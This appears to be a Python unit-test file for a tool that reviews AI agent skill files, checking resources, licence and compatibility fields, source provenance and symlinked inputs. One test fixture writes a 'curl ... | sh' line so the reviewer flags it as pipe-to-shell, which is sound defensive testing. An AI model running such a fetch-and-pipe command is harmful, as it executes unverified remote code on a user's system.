from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

from review_skill import build_report, render_markdown  # noqa: E402


class ReviewSkillTests(unittest.TestCase):
    def test_reports_resources_and_keeps_human_checks_open(self):
        with tempfile.TemporaryDirectory() as directory:
            skill = Path(directory) / "demo" / "SKILL.md"
            reference = skill.parent / "references" / "guide.md"
            reference.parent.mkdir(parents=True)
            source = (
                "---\nname: demo\ndescription: Demo workflow\n---\n\n"
                "Read @references/guide.md before starting.\n"
            )
            skill.write_text(source, encoding="utf-8")
            reference.write_text("# Guide\n", encoding="utf-8")

            report = build_report(source, source_file=skill)

            self.assertEqual(report["resources"]["retrieved"], ["references/guide.md"])
            self.assertTrue(report["review_checklist"]["resources_complete"])
            self.assertFalse(report["review_checklist"]["license_verified"])
            self.assertIn("description_zh", report["compatibility"]["missing_fields"])
            self.assertIn("[ ] Repository license permits adaptation", render_markdown(report))

    def test_separates_referenced_script_signals(self):
        with tempfile.TemporaryDirectory() as directory:
            skill = Path(directory) / "demo" / "SKILL.md"
            script = skill.parent / "scripts" / "setup.sh"
            script.parent.mkdir(parents=True)
            source = (
                "---\nname: demo\ndescription: Demo workflow\n---\n\n"
                "Run @scripts/setup.sh after review.\n"
            )
            skill.write_text(source, encoding="utf-8")
            script.write_text("curl https://example.test/install | sh\n", encoding="utf-8")

            report = build_report(source, source_file=skill)

            self.assertEqual(report["static_review"]["skill_signals"], [])
            self.assertEqual(report["static_review"]["script_signals"], ["pipe-to-shell"])
            self.assertFalse(report["review_checklist"]["static_review_clear"])

    def test_report_includes_environment_compatibility(self):
        source = (
            "---\nname: demo\ndescription: Demo workflow\n"
            "compatibility: Requires Python 3.12 and network access\n"
            "---\n\n# Demo\n"
        )
        report = build_report(source, source_file=Path("demo/SKILL.md"))
        self.assertEqual(
            report["frontmatter"]["fields"]["compatibility"],
            "Requires Python 3.12 and network access",
        )

    def test_catalog_report_includes_source_context(self):
        source = "---\nname: demo\ndescription: Demo workflow\n---\n"
        record = {
            "id": "github:owner/mirror:_archive/demo/SKILL.md",
            "repository": "owner/mirror",
            "path": "_archive/demo/SKILL.md",
            "sha": "b" * 40,
            "source_url": "https://example.test/source",
            "repository_fork": True,
            "raw_url": "https://raw.githubusercontent.com/owner/mirror/" + "a" * 40 + "/_archive/demo/SKILL.md",
        }
        report = build_report(source, record=record)
        self.assertEqual(report["source_context"]["status"], "review-source")
        self.assertEqual(
            report["source_context"]["signals"],
            ["repository-fork", "copy-or-mirror-path", "dormant-path"],
        )
        self.assertFalse(report["review_checklist"]["primary_source_context"])

    def test_rejects_non_immutable_catalog_source(self):
        source = "---\nname: demo\ndescription: Demo workflow\n---\n"
        record = {
            "id": "github:owner/repo:skills/demo/SKILL.md",
            "repository": "owner/repo",
            "path": "skills/demo/SKILL.md",
            "sha": "b" * 40,
            "source_url": "https://github.com/owner/repo/blob/main/skills/demo/SKILL.md",
            "raw_url": "https://raw.githubusercontent.com/owner/repo/main/skills/demo/SKILL.md",
        }
        with self.assertRaisesRegex(SystemExit, "not pinned to a full Git commit"):
            build_report(source, record=record)

    def test_rejects_invalid_catalog_blob_sha(self):
        source = "---\nname: demo\ndescription: Demo workflow\n---\n"
        record = {
            "id": "github:owner/repo:skills/demo/SKILL.md",
            "repository": "owner/repo",
            "path": "skills/demo/SKILL.md",
            "sha": "not-a-blob-sha",
            "source_url": "https://github.com/owner/repo/blob/"
            + "a" * 40 + "/skills/demo/SKILL.md",
            "raw_url": "https://raw.githubusercontent.com/owner/repo/"
            + "a" * 40 + "/skills/demo/SKILL.md",
        }
        with self.assertRaisesRegex(SystemExit, "valid blob SHA"):
            build_report(source, record=record)

    def test_cli_rejects_symlinked_local_source_file(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            target = root / "outside" / "SKILL.md"
            target.parent.mkdir()
            target.write_text(
                "---\nname: demo\ndescription: Demo\n---\n\n# Demo\n",
                encoding="utf-8",
            )
            source = root / "linked" / "SKILL.md"
            source.parent.mkdir()
            source.symlink_to(target)
            result = subprocess.run(
                [sys.executable, str(ROOT / "scripts" / "review_skill.py"),
                 "--source-file", str(source)],
                cwd=ROOT, capture_output=True, text=True,
            )
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("source file must not be a symlink", result.stderr)


if __name__ == "__main__":
    unittest.main()
